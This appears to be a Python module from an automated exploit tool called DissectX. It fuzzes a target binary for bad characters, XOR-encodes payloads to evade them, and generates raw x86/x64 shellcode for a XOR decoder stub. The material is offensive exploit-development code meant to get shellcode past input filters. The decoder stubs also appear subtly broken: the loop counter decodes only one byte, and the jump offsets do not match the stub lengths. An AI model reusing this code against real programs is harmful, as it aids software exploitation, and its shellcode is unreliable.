"""
Bad Byte Detection Module for DissectX Auto-Exploiter

Automatically detects bad characters in payloads and suggests encodings.
"""

from typing import Set, List, Optional, Tuple


class BadByteDetector:
    """
    Detects bad bytes that cause payload failures
    """
    
    # Common bad bytes in different contexts
    COMMON_BAD_BYTES = {
        'null': {0x00},  # NULL byte
        'newline': {0x0a, 0x0d},  # \n, \r
        'space': {0x20},  # Space
        'all_whitespace': {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20},  # All whitespace
    }
    
    def __init__(self, binary_path: str):
        self.binary_path = binary_path
        self.detected_bad_bytes: Set[int] = set()
        
    def test_byte(self, byte_val: int) -> bool:
        """
        Test if a specific byte is bad
        
        Args:
            byte_val: Byte value to test (0-255)
            
        Returns:
            True if byte is bad, False otherwise
        """
        from pwn import process
        
        try:
            # Send payload with this byte
            p = process(self.binary_path)
            test_payload = b'A' * 100 + bytes([byte_val]) + b'B' * 100
            p.sendline(test_payload)
            
            try:
                output = p.recvall(timeout=1)
                p.close()
                
                # Check if byte appears in output
                if byte_val in output:
                    return False  # Byte is good
                else:
                    return True  # Byte is bad (filtered/truncated)
            except:
                p.close()
                return True  # Assume bad if process crashes
                
        except Exception as e:
            print(f"[-] Error testing byte {hex(byte_val)}: {e}")
            return True  # Assume bad on error
    
    def detect_bad_bytes(self, quick_test: bool = True) -> Set[int]:
        """
        Detect all bad bytes in the binary
        
        Args:
            quick_test: If True, only test common bad bytes
            
        Returns:
            Set of bad byte values
        """
        print("[*] Detecting bad bytes...")
        
        if quick_test:
            # Test only common bad bytes
            test_bytes = set()
            for category, bytes_set in self.COMMON_BAD_BYTES.items():
                test_bytes.update(bytes_set)
        else:
            # Test all bytes 0x00-0xFF
            test_bytes = set(range(256))
        
        bad_bytes = set()
        
        for byte_val in test_bytes:
            if self.test_byte(byte_val):
                bad_bytes.add(byte_val)
                print(f"[!] Bad byte detected: {hex(byte_val)}")
        
        self.detected_bad_bytes = bad_bytes
        
        if bad_bytes:
            print(f"[+] Found {len(bad_bytes)} bad bytes: {[hex(b) for b in sorted(bad_bytes)]}")
        else:
            print("[+] No bad bytes detected!")
        
        return bad_bytes
    
    def check_payload(self, payload: bytes) -> Tuple[bool, List[int]]:
        """
        Check if payload contains bad bytes
        
        Args:
            payload: Payload to check
            
        Returns:
            Tuple of (has_bad_bytes, list_of_bad_byte_positions)
        """
        bad_positions = []
        
        for i, byte_val in enumerate(payload):
            if byte_val in self.detected_bad_bytes:
                bad_positions.append(i)
        
        has_bad = len(bad_positions) > 0
        return has_bad, bad_positions
    
    def suggest_encoding(self, bad_bytes: Set[int]) -> str:
        """
        Suggest encoding method based on bad bytes
        
        Args:
            bad_bytes: Set of bad byte values
            
        Returns:
            Suggested encoding method
        """
        if 0x00 in bad_bytes:
            return "xor"  # XOR encoding avoids NULL
        elif bad_bytes & {0x0a, 0x0d}:  # Newlines
            return "alphanumeric"  # Use only alphanumeric characters
        elif len(bad_bytes) < 5:
            return "xor"  # XOR can avoid small set of bad bytes
        else:
            return "custom"  # Need custom encoder
    
    def encode_payload(self, payload: bytes, method: str = "xor", key: int = 0x42) -> bytes:
        """
        Encode payload to avoid bad bytes
        
        Args:
            payload: Original payload
            method: Encoding method ('xor', 'add', 'sub')
            key: Encoding key
            
        Returns:
            Encoded payload
        """
        if method == "xor":
            return bytes([b ^ key for b in payload])
        elif method == "add":
            return bytes([(b + key) % 256 for b in payload])
        elif method == "sub":
            return bytes([(b - key) % 256 for b in payload])
        else:
            return payload  # No encoding
    
    def generate_decoder_stub(self, method: str = "xor", key: int = 0x42, arch: str = "x64") -> bytes:
        """
        Generate decoder stub for encoded shellcode
        
        Args:
            method: Encoding method
            key: Encoding key
            arch: Architecture ('x86' or 'x64')
            
        Returns:
            Decoder stub shellcode
        """
        if arch == "x64":
            if method == "xor":
                # Simple XOR decoder for x64
                decoder = b"\xeb\x0b"  # jmp short +11
                decoder += b"\x5e"  # pop rsi (get shellcode address)
                decoder += b"\x48\x31\xc9"  # xor rcx, rcx
                decoder += b"\x48\xff\xc1"  # inc rcx (counter)
                decoder += b"\x80\x36" + bytes([key])  # xor byte [rsi], key
                decoder += b"\x48\xff\xc6"  # inc rsi
                decoder += b"\xe2\xf5"  # loop -11
                decoder += b"\xe8\xf0\xff\xff\xff"  # call -16
                return decoder
        else:
            # x86 XOR decoder
            decoder = b"\xeb\x0b"  # jmp short +11
            decoder += b"\x5e"  # pop esi
            decoder += b"\x31\xc9"  # xor ecx, ecx
            decoder += b"\x41"  # inc ecx
            decoder += b"\x80\x36" + bytes([key])  # xor byte [esi], key
            decoder += b"\x46"  # inc esi
            decoder += b"\xe2\xf9"  # loop -7
            decoder += b"\xe8\xf0\xff\xff\xff"  # call -16
            return decoder
        
        return b""
